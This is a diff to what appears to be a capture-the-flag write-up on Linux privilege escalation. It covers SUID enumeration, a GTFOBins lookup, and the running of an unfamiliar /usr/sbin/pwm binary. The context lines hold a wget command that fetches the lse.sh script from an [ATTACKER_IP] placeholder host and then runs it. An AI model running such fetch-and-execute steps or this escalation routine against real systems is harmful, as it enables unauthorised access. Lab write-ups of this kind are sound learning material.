@@ -119,3 +119,17 @@ wget http://[ATTACKER_IP]:8080/lse.sh
 chmod +x lse.sh
 ./lse.sh
 ```
+Seeing nothing listed in the CVE section, we turn or attention to the uncommon SUID binaries. 
+
+<img width="730" height="81" alt="lse_sh_output_lookup" src="https://github.com/user-attachments/assets/c0fe37ec-e703-46b3-a744-249939e1627b" />
+
+We can't write to it, since it's owned by root:
+
+<img width="510" height="53" alt="image" src="https://github.com/user-attachments/assets/56e1151b-ea50-491a-b8ae-d730bff3c3c1" />
+
+
+mistaking /usr/sbin/pwm for a system binary, I looked it up on https://gtfobins.github.io/ , a database of how to (mis)use system binaries with elevated privileges. Since it wasn't listed, I was curious, so I ran the binary: 
+
+<img width="890" height="105" alt="image" src="https://github.com/user-attachments/assets/c9ae8b65-9c74-421e-a342-aecd6e198bc4" />
+
+
